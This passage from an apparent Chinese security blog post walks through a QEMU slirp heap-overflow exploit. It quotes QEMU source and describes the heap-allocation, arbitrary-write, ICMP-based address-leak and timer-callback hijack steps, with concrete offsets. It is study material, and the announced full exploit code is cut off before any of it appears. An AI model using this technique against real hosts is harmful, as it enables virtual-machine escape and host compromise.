class="hljs-type">void</span><br><span class="hljs-title function_">ip_input</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mbuf *m)</span><br>&#123;<br>…………<br>…………<br><span class="hljs-keyword">if</span> (ip-&gt;ip_off &amp;~ IP_DF) &#123;<br>  <span class="hljs-keyword">register</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipq</span> *<span class="hljs-title">fp</span>;</span><br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">qlink</span> *<span class="hljs-title">l</span>;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Look for queue of fragments</span><br><span class="hljs-comment"> * of this datagram.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">for</span> (l = slirp-&gt;ipq.ip_link.next; l != &amp;slirp-&gt;ipq.ip_link;<br>     l = l-&gt;next) &#123;<br>            fp = container_of(l, <span class="hljs-keyword">struct</span> ipq, ip_link);<br>            <span class="hljs-keyword">if</span> (ip-&gt;ip_id == fp-&gt;ipq_id &amp;&amp;<br>                    ip-&gt;ip_src.s_addr == fp-&gt;ipq_src.s_addr &amp;&amp;<br>                    ip-&gt;ip_dst.s_addr == fp-&gt;ipq_dst.s_addr &amp;&amp;<br>                    ip-&gt;ip_p == fp-&gt;ipq_p)<br>    <span class="hljs-keyword">goto</span> found;<br>        &#125;<br>        fp = <span class="hljs-literal">NULL</span>;<br>found:<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Adjust ip_len to not reflect header,</span><br><span class="hljs-comment"> * set ip_mff if more fragments are expected,</span><br><span class="hljs-comment"> * convert offset of this to bytes.</span><br><span class="hljs-comment"> */</span><br>ip-&gt;ip_len -= hlen;<br><span class="hljs-keyword">if</span> (ip-&gt;ip_off &amp; IP_MF)<br>  ip-&gt;ip_tos |= <span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span><br>  ip-&gt;ip_tos &amp;= ~<span class="hljs-number">1</span>;<br><br>ip-&gt;ip_off &lt;&lt;= <span class="hljs-number">3</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If datagram marked as having more fragments</span><br><span class="hljs-comment"> * or if this is not the first fragment,</span><br><span class="hljs-comment"> * attempt reassembly; if it succeeds, proceed.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (ip-&gt;ip_tos &amp; <span class="hljs-number">1</span> || ip-&gt;ip_off) &#123;<br>ip = ip_reass(slirp, ip, fp);<br>                        <span class="hljs-keyword">if</span> (ip == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span>;<br>m = dtom(slirp, ip);<br>&#125; <span class="hljs-keyword">else</span><br>…………<br>…………<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> ip *<br>ip_reass(Slirp *slirp, <span class="hljs-keyword">struct</span> ip *ip, <span class="hljs-keyword">struct</span> ipq *fp)<br>&#123;<br>…………<br>…………<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * If first fragment to arrive, create a reassembly queue.</span><br><span class="hljs-comment">     */</span><br>        <span class="hljs-keyword">if</span> (fp == <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-keyword">struct</span> mbuf *t = m_get(slirp)<br>        &#125;<br>…………<br>…………<br>&#125;<br><br><br><span class="hljs-keyword">struct</span> mbuf *<br>m_get(Slirp *slirp)<br>&#123;<br>    <span class="hljs-keyword">register</span> <span class="hljs-keyword">struct</span> mbuf *m;<br>    <span class="hljs-type">int</span> flags = <span class="hljs-number">0</span>;<br><br>    DEBUG_CALL(<span class="hljs-string">&quot;m_get&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (slirp-&gt;m_freelist.qh_link == &amp;slirp-&gt;m_freelist) &#123;<br>                m = g_malloc(SLIRP_MSIZE);<br>…………<br>…………<br>&#125;<br></code></pre></td></tr></table></figure><p>对于malloc原语最浅显的理解就是发送不同的（ip_id、ip_src.s_addr 、ip-&gt;ip_dst.s_addr这些值不完全相同即可）数据包，并且分片为多个IP包，但是每种数据包分片的IP包并不一次性发送完，让其一直等待最后一个IP包，这样每次发送这种IP包分配内存后就会一直占用内存，并不会对其释放。</p><h3 id="任意写"><a href="#任意写" class="headerlink" title="任意写"></a>任意写</h3><p>同样也是在<a href="https://elixir.bootlin.com/qemu/v3.1.0/source/slirp/ip_input.c#L76">ip_input函数</a>中，先使用malloc原语发送一个IP包，然后设置一个与发送过的IP包的ip_id、ip_src.s_addr和ip-&gt;ip_dst.s_addr相同的IP包，并且这个IP包DF&#x3D;0   MF&#x3D;0  Fragmentation offset存在值，表示其可以分片并且属于数据包的最后一个；进入ip_input函数后可以通过<code>ip-&gt;ip_off &amp;~ IP_DF</code>判断，接下来会在链表中获取其它IP包，判断ip_id、ip_src.s_addr 、ip-&gt;ip_dst.s_addr和ip_p这些值，得到先前发送过的IP包，进入ip_reass函数后调用m_cat函数，来实现对IP包数据的合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">ip_input</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mbuf *m)</span><br>&#123;<br>…………<br>…………<br><span class="hljs-keyword">if</span> (ip-&gt;ip_off &amp;~ IP_DF) &#123;<br>  <span class="hljs-keyword">register</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipq</span> *<span class="hljs-title">fp</span>;</span><br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">qlink</span> *<span class="hljs-title">l</span>;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Look for queue of fragments</span><br><span class="hljs-comment"> * of this datagram.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">for</span> (l = slirp-&gt;ipq.ip_link.next; l != &amp;slirp-&gt;ipq.ip_link;<br>     l = l-&gt;next) &#123;<br>            fp = container_of(l, <span class="hljs-keyword">struct</span> ipq, ip_link);<br>            <span class="hljs-keyword">if</span> (ip-&gt;ip_id == fp-&gt;ipq_id &amp;&amp;<br>                    ip-&gt;ip_src.s_addr == fp-&gt;ipq_src.s_addr &amp;&amp;<br>                    ip-&gt;ip_dst.s_addr == fp-&gt;ipq_dst.s_addr &amp;&amp;<br>                    ip-&gt;ip_p == fp-&gt;ipq_p)<br>    <span class="hljs-keyword">goto</span> found;<br>        &#125;<br>        fp = <span class="hljs-literal">NULL</span>;<br>found:<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Adjust ip_len to not reflect header,</span><br><span class="hljs-comment"> * set ip_mff if more fragments are expected,</span><br><span class="hljs-comment"> * convert offset of this to bytes.</span><br><span class="hljs-comment"> */</span><br>ip-&gt;ip_len -= hlen;<br><span class="hljs-keyword">if</span> (ip-&gt;ip_off &amp; IP_MF)<br>  ip-&gt;ip_tos |= <span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span><br>  ip-&gt;ip_tos &amp;= ~<span class="hljs-number">1</span>;<br><br>ip-&gt;ip_off &lt;&lt;= <span class="hljs-number">3</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If datagram marked as having more fragments</span><br><span class="hljs-comment"> * or if this is not the first fragment,</span><br><span class="hljs-comment"> * attempt reassembly; if it succeeds, proceed.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (ip-&gt;ip_tos &amp; <span class="hljs-number">1</span> || ip-&gt;ip_off) &#123;<br>ip = ip_reass(slirp, ip, fp);<br>                        <span class="hljs-keyword">if</span> (ip == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span>;<br>m = dtom(slirp, ip);<br>&#125; <span class="hljs-keyword">else</span><br>…………<br>…………<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> ip *<br>ip_reass(Slirp *slirp, <span class="hljs-keyword">struct</span> ip *ip, <span class="hljs-keyword">struct</span> ipq *fp)<br>&#123;<br>    <span class="hljs-keyword">register</span> <span class="hljs-keyword">struct</span> mbuf *m = dtom(slirp, ip);<br>    <span class="hljs-keyword">register</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipasfrag</span> *<span class="hljs-title">q</span>;</span><br>    <span class="hljs-type">int</span> hlen = ip-&gt;ip_hl &lt;&lt; <span class="hljs-number">2</span>;<br>    <span class="hljs-type">int</span> i, next;<br>…………<br>…………<br><br>    q = fp-&gt;frag_link.next;<br>    m = dtom(slirp, q);<br><br>    q = (<span class="hljs-keyword">struct</span> ipasfrag *) q-&gt;ipf_next;<br>    <span class="hljs-keyword">while</span> (q != (<span class="hljs-keyword">struct</span> ipasfrag*)&amp;fp-&gt;frag_link) &#123;<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mbuf</span> *<span class="hljs-title">t</span> =</span> dtom(slirp, q);<br>      q = (<span class="hljs-keyword">struct</span> ipasfrag *) q-&gt;ipf_next;<br>      m_cat(m, t);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">m_cat</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mbuf *m, <span class="hljs-keyword">struct</span> mbuf *n)</span><br>&#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * If there&#x27;s no room, realloc</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">if</span> (M_FREEROOM(m) &lt; n-&gt;m_len)<br>        m_inc(m, m-&gt;m_len + n-&gt;m_len);<br><br>    <span class="hljs-built_in">memcpy</span>(m-&gt;m_data+m-&gt;m_len, n-&gt;m_data, n-&gt;m_len);<br>    m-&gt;m_len += n-&gt;m_len;<br><br>    m_free(n);<br>&#125;<br></code></pre></td></tr></table></figure><p>对于上述过程最浅显的理解就是一个数据包分片发送后，当最后一个IP包也发送完成后，就会将这些IP包重新组合起来。</p><p>堆溢出覆盖第一个IP包的m_data，再发送最后一个IP包，进入m_cat函数后调用<code>memcpy(m-&gt;m_data+m-&gt;m_len, n-&gt;m_data, n-&gt;m_len)</code>来实现对<code>m_data + m_len</code>这个地址的任意写。</p><h3 id="信息泄漏"><a href="#信息泄漏" class="headerlink" title="信息泄漏"></a>信息泄漏</h3><p>个人感觉这一步是最为巧妙的地方，利用伪造ICMP响应请求包，从响应应答包中泄漏信息。</p><p>具体过程如下：</p><ol><li>发送MF标志设置为1的IP包，利用堆溢出将此IP包的m_data的低位3位覆盖，覆盖的值具体跟本地堆环境中存在的qemu的地址信息有关，这个值设置到具有qemu地址信息的低地址处；</li><li>然后利用任意地址写将伪造的ICMP包头写入到该地址处；</li><li>接着是继续发送一个IP包，不过这个IP包具体为ICMP协议的请求包，并将其MF标志设置为1，也是利用堆溢出将此IP包的m_data的低位覆盖成伪造的ICMP请求包的位置；</li><li>最后再发送一个MF为0的ICMP协议的IP包，ICMP协议的IP包重组后，响应请求ICMP包的数据就变成了伪造的ICMP请求包，然后等待ICMP应答包，在应答包中可以得到程序地址以及堆地址，实现信息泄露。</li></ol><p>​                              </p><p>自己本地堆环境中存在qemu的地址信息内存块如下，就在tcache结构体头的后面：</p><img src="/img/20/Screenshot 2023-10-12 004330.png" style="zoom: 67%;" /><p>第一次修改的低3位值为0x6e0，进行任意写时就是对0x7f375c000ae0地址处写入伪造的ICMP包头</p><img src="/img/20/Screenshot 2023-10-12 012105.png" style="zoom:80%;" /><p>第二次修改的低3位值为0xb02，ICMP的应答包就会将m_data 后面信息泄漏出去</p><img src="/img/20/Screenshot 2023-10-12 012125.png" style="zoom:80%;" /><p>​</p><h3 id="程序执行流控制"><a href="#程序执行流控制" class="headerlink" title="程序执行流控制"></a>程序执行流控制</h3><p>在堆中伪造一个QEMUTimerList结构体和QEMUTimer结构体，通过任意写将伪造的QEMUTimerList地址覆盖到qemu的全局变量main_loop_tlg，等expire_time时间到，将会执行QEMUTimer结构体中的cb(opaque)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">qemu_clock_run_timers</span><span class="hljs-params">(QEMUClockType type)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> timerlist_run_timers(main_loop_tlg.tl[type]);<br>&#125;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">timerlist_run_timers</span><span class="hljs-params">(QEMUTimerList *timer_list)</span><br>&#123;<br>    QEMUTimer *ts;<br>    <span class="hljs-type">int64_t</span> current_time;<br>    <span class="hljs-type">bool</span> progress = <span class="hljs-literal">false</span>;<br>    QEMUTimerCB *cb;<br>    <span class="hljs-type">void</span> *opaque;<br>…………<br>…………<br>    current_time = qemu_clock_get_ns(timer_list-&gt;clock-&gt;type);<br>    qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock);<br>    <span class="hljs-keyword">while</span> ((ts = timer_list-&gt;active_timers)) &#123;<br>        <span class="hljs-keyword">if</span> (!timer_expired_ns(ts, current_time)) &#123;<br>            <span class="hljs-comment">/* No expired timers left.  The checkpoint can be skipped</span><br><span class="hljs-comment">             * if no timers fired or they were all external.</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (need_replay_checkpoint<br>                &amp;&amp; !(ts-&gt;attributes &amp; QEMU_TIMER_ATTR_EXTERNAL)) &#123;<br>            <span class="hljs-comment">/* once we got here, checkpoint clock only once */</span><br>            need_replay_checkpoint = <span class="hljs-literal">false</span>;<br>            qemu_mutex_unlock(&amp;timer_list-&gt;active_timers_lock);<br>            <span class="hljs-keyword">if</span> (!replay_checkpoint(CHECKPOINT_CLOCK_VIRTUAL)) &#123;<br>                <span class="hljs-keyword">goto</span> out;<br>            &#125;<br>            qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock);<br>            <span class="hljs-comment">/* The lock was released; start over again in case the list was</span><br><span class="hljs-comment">             * modified.</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-comment">/* remove timer from the list before calling the callback */</span><br>        timer_list-&gt;active_timers = ts-&gt;next;<br>        ts-&gt;next = <span class="hljs-literal">NULL</span>;<br>        ts-&gt;expire_time = <span class="hljs-number">-1</span>;<br>        cb = ts-&gt;cb;<br>        opaque = ts-&gt;opaque;<br><br>        <span class="hljs-comment">/* run the callback (the timer list can be modified) */</span><br>        qemu_mutex_unlock(&amp;timer_list-&gt;active_timers_lock);<br>        cb(opaque);<span class="hljs-comment">//&lt;------运行至此</span><br>        qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock);<br><br>        progress = <span class="hljs-literal">true</span>;<br>    &#125;<br>…………<br>…………    <br>&#125;<br></code></pre></td></tr></table></figure><p>​                                                            </p><p>完整exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span 